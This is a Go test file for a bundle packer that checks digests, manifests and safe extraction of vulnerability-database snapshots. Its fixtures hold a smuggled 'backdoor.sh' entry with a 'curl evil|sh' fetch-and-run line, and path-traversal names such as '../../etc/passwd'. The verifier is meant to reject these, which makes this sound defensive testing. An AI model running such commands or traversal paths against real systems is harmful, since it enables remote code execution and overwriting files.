package pack

import (
	"archive/tar"
	"bytes"
	"compress/gzip"
	"encoding/json"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"
)

const stamp = "2026-08-20T12:00:00Z"

func sourceTree(t *testing.T, files map[string]string) string {
	t.Helper()
	root := t.TempDir()
	for name, body := range files {
		p := filepath.Join(root, filepath.FromSlash(name))
		if err := os.MkdirAll(filepath.Dir(p), 0o755); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(p, []byte(body), 0o644); err != nil {
			t.Fatal(err)
		}
	}
	return root
}

func meta() Manifest {
	return Manifest{
		Kind: KindVulnerability, Name: "osv-snapshot", Version: "2026.08.20",
		CreatedAt: stamp,
		Sources: []Source{{
			Name: "osv.dev", URL: "https://osv.dev", Version: "2026-08-20",
			RetrievedAt: stamp,
		}},
	}
}

func build(t *testing.T, files map[string]string) ([]byte, *Manifest) {
	t.Helper()
	var buf bytes.Buffer
	m, err := Create(sourceTree(t, files), meta(), &buf)
	if err != nil {
		t.Fatalf("Create: %v", err)
	}
	return buf.Bytes(), m
}

func TestRoundTrip(t *testing.T) {
	files := map[string]string{
		"db/osv.json":     `{"vulns":[]}`,
		"db/index.txt":    "osv.json\n",
		"README":          "snapshot\n",
		"nested/deep/a.b": "x",
	}
	data, created := build(t, files)

	verified, err := Verify(bytes.NewReader(data))
	if err != nil {
		t.Fatalf("Verify: %v", err)
	}
	if len(verified.Entries) != len(files) {
		t.Errorf("verified %d entries, want %d", len(verified.Entries), len(files))
	}
	if verified.Name != created.Name || verified.Kind != KindVulnerability {
		t.Error("manifest metadata did not survive the round trip")
	}
	for _, e := range verified.Entries {
		if e.SHA256 == "" || e.SHA512 == "" {
			t.Errorf("entry %s is missing a digest; BSI requires SHA-512 and the "+
				"ecosystem reads SHA-256, so both have to be there", e.Path)
		}
	}

	dest := t.TempDir()
	if _, err := Extract(bytes.NewReader(data), dest); err != nil {
		t.Fatalf("Extract: %v", err)
	}
	for name, body := range files {
		got, err := os.ReadFile(filepath.Join(dest, filepath.FromSlash(name)))
		if err != nil {
			t.Errorf("extracted file %s missing: %v", name, err)
			continue
		}
		if string(got) != body {
			t.Errorf("extracted %s = %q, want %q", name, got, body)
		}
	}
	if _, err := os.Stat(filepath.Join(dest, ManifestName)); err == nil {
		t.Error("the manifest was extracted alongside the data; it describes the bundle, not its contents")
	}
}

// The same inputs must produce the same bytes. A reviewer on the far side of an
// air gap mostly compares a new bundle against one already approved, and a
// bundle that differed run to run would make that impossible.
func TestCreateIsDeterministic(t *testing.T) {
	files := map[string]string{"b.json": "2", "a.json": "1", "c/d.json": "3"}
	root := sourceTree(t, files)

	var first, second bytes.Buffer
	if _, err := Create(root, meta(), &first); err != nil {
		t.Fatal(err)
	}
	if _, err := Create(root, meta(), &second); err != nil {
		t.Fatal(err)
	}
	if !bytes.Equal(first.Bytes(), second.Bytes()) {
		t.Error("two bundles of the same tree differ; they cannot be compared against an approved one")
	}
}

// The manifest is evidence, not a table of contents. A verifier that read the
// recorded digests without recomputing them would accept any bytes at all.
func TestAlteredContentFailsVerification(t *testing.T) {
	data, _ := build(t, map[string]string{"db/osv.json": `{"vulns":[]}`})

	// Rebuild the archive with one entry's bytes changed, manifest untouched.
	tampered := rewrite(t, data, func(name string, body []byte) []byte {
		if name == "db/osv.json" {
			return []byte(`{"vulns":["injected"]}`)
		}
		return body
	})
	if _, err := Verify(bytes.NewReader(tampered)); err == nil {
		t.Fatal("altered content verified; the manifest was trusted rather than checked")
	} else if !strings.Contains(err.Error(), "digest") && !strings.Contains(err.Error(), "bytes") {
		t.Errorf("error does not say what went wrong: %v", err)
	}
}

// An entry the manifest never mentions is the shape a smuggled payload takes.
// A verifier that only checked the listed entries would walk straight past it.
func TestUndocumentedEntryFailsVerification(t *testing.T) {
	data, _ := build(t, map[string]string{"db/osv.json": "{}"})
	extra := appendEntry(t, data, "db/backdoor.sh", "#!/bin/sh\ncurl evil|sh\n")

	if _, err := Verify(bytes.NewReader(extra)); err == nil {
		t.Fatal("an entry absent from the manifest verified")
	} else if !strings.Contains(err.Error(), "manifest does not list") {
		t.Errorf("error does not name the cause: %v", err)
	}
}

// A listed entry that is not in the archive means the bundle is incomplete, and
// a consumer that unpacked it would silently be missing data it believes it has.
func TestMissingListedEntryFailsVerification(t *testing.T) {
	data, _ := build(t, map[string]string{"a.json": "1", "b.json": "2"})
	stripped := rewrite(t, data, func(name string, body []byte) []byte {
		if name == "b.json" {
			return nil // dropped
		}
		return body
	})
	if _, err := Verify(bytes.NewReader(stripped)); err == nil {
		t.Fatal("a bundle missing a listed entry verified")
	} else if !strings.Contains(err.Error(), "missing") {
		t.Errorf("error does not name the cause: %v", err)
	}
}

// Path traversal is the classic archive escape. It has to fail at verification,
// before anything is written, rather than at extraction time.
func TestTraversalEntryIsRefused(t *testing.T) {
	for _, evil := range []string{"../escape.sh", "../../etc/passwd", "/absolute", "a/../../b"} {
		data := handMade(t, evil, "payload")
		if _, err := Verify(bytes.NewReader(data)); err == nil {
			t.Errorf("entry %q verified; extraction would write outside the destination", evil)
		}
	}
}

// Extraction must not leave a half-unpacked tree when verification fails.
// Something downstream would eventually read it and treat it as complete.
func TestExtractWritesNothingWhenVerificationFails(t *testing.T) {
	data, _ := build(t, map[string]string{"good.json": "1"})
	tampered := rewrite(t, data, func(name string, body []byte) []byte {
		if name == "good.json" {
			return []byte("2")
		}
		return body
	})

	dest := t.TempDir()
	if _, err := Extract(bytes.NewReader(tampered), dest); err == nil {
		t.Fatal("Extract accepted a tampered bundle")
	}
	entries, err := os.ReadDir(dest)
	if err != nil {
		t.Fatal(err)
	}
	if len(entries) != 0 {
		t.Errorf("Extract left %d entries behind after failing; a partial tree reads as a complete one",
			len(entries))
	}
}

// A source with no retrieval date cannot be assessed for staleness, which is
// the first question anybody sensible asks of a vulnerability database.
func TestSourceWithoutRetrievalDateIsRefused(t *testing.T) {
	m := meta()
	m.Sources = []Source{{Name: "osv.dev", URL: "https://osv.dev"}}
	var buf bytes.Buffer
	if _, err := Create(sourceTree(t, map[string]string{"a": "1"}), m, &buf); err == nil {
		t.Error("a source with no retrieval date was accepted")
	}
}

func TestEmptySourceTreeIsRefused(t *testing.T) {
	var buf bytes.Buffer
	if _, err := Create(t.TempDir(), meta(), &buf); err == nil {
		t.Error("an empty bundle was created; it would verify and deliver nothing")
	}
}

// A future format must not be read by a build that predates it.
func TestUnknownFormatVersionIsRefused(t *testing.T) {
	data, _ := build(t, map[string]string{"a.json": "1"})
	bumped := rewrite(t, data, func(name string, body []byte) []byte {
		if name == ManifestName {
			var m map[string]any
			if err := json.Unmarshal(body, &m); err != nil {
				t.Fatal(err)
			}
			m["formatVersion"] = FormatVersion + 1
			out, _ := json.Marshal(m)
			return out
		}
		return body
	})
	if _, err := Verify(bytes.NewReader(bumped)); err == nil {
		t.Error("a newer format version was read by this build rather than refused")
	}
}

// --- helpers that rebuild an archive so a test can tamper with it ---

func rewrite(t *testing.T, data []byte, fn func(name string, body []byte) []byte) []byte {
	t.Helper()
	gz, err := gzip.NewReader(bytes.NewReader(data))
	if err != nil {
		t.Fatal(err)
	}
	tr := tar.NewReader(gz)

	var out bytes.Buffer
	gw := gzip.NewWriter(&out)
	tw := tar.NewWriter(gw)
	for {
		h, err := tr.Next()
		if err != nil {
			break
		}
		body := make([]byte, h.Size)
		if _, err := readFull(tr, body); err != nil {
			t.Fatal(err)
		}
		nb := fn(h.Name, body)
		if nb == nil {
			continue
		}
		nh := *h
		nh.Size = int64(len(nb))
		if err := tw.WriteHeader(&nh); err != nil {
			t.Fatal(err)
		}
		if _, err := tw.Write(nb); err != nil {
			t.Fatal(err)
		}
	}
	tw.Close()
	gw.Close()
	return out.Bytes()
}

func appendEntry(t *testing.T, data []byte, name, body string) []byte {
	t.Helper()
	return rewriteAppend(t, data, name, body)
}

func rewriteAppend(t *testing.T, data []byte, name, body string) []byte {
	t.Helper()
	var out bytes.Buffer
	gz, err := gzip.NewReader(bytes.NewReader(data))
	if err != nil {
		t.Fatal(err)
	}
	tr := tar.NewReader(gz)
	gw := gzip.NewWriter(&out)
	tw := tar.NewWriter(gw)
	for {
		h, err := tr.Next()
		if err != nil {
			break
		}
		b := make([]byte, h.Size)
		if _, err := readFull(tr, b); err != nil {
			t.Fatal(err)
		}
		if err := tw.WriteHeader(h); err != nil {
			t.Fatal(err)
		}
		tw.Write(b)
	}
	tw.WriteHeader(&tar.Header{
		Name: name, Mode: 0o644, Size: int64(len(body)),
		ModTime: time.Unix(0, 0).UTC(), Typeflag: tar.TypeReg, Format: tar.FormatPAX,
	})
	tw.Write([]byte(body))
	tw.Close()
	gw.Close()
	return out.Bytes()
}

// handMade builds an archive with a manifest that lists one hostile path, so
// the traversal check is exercised against a manifest that agrees with it.
func handMade(t *testing.T, name, body string) []byte {
	t.Helper()
	m := Manifest{
		FormatVersion: FormatVersion, Kind: KindMixed, Name: "hostile",
		CreatedAt: stamp,
		Entries:   []Entry{{Path: name, Size: int64(len(body))}},
	}
	mb, _ := json.MarshalIndent(&m, "", "  ")
	var out bytes.Buffer
	gw := gzip.NewWriter(&out)
	tw := tar.NewWriter(gw)
	tw.WriteHeader(&tar.Header{
		Name: ManifestName, Mode: 0o644, Size: int64(len(mb)),
		ModTime: time.Unix(0, 0).UTC(), Typeflag: tar.TypeReg, Format: tar.FormatPAX,
	})
	tw.Write(mb)
	tw.WriteHeader(&tar.Header{
		Name: name, Mode: 0o644, Size: int64(len(body)),
		ModTime: time.Unix(0, 0).UTC(), Typeflag: tar.TypeReg, Format: tar.FormatPAX,
	})
	tw.Write([]byte(body))
	tw.Close()
	gw.Close()
	return out.Bytes()
}

func readFull(r interface{ Read([]byte) (int, error) }, b []byte) (int, error) {
	n := 0
	for n < len(b) {
		m, err := r.Read(b[n:])
		n += m
		if err != nil {
			if n == len(b) {
				return n, nil
			}
			return n, err
		}
	}
	return n, nil
}
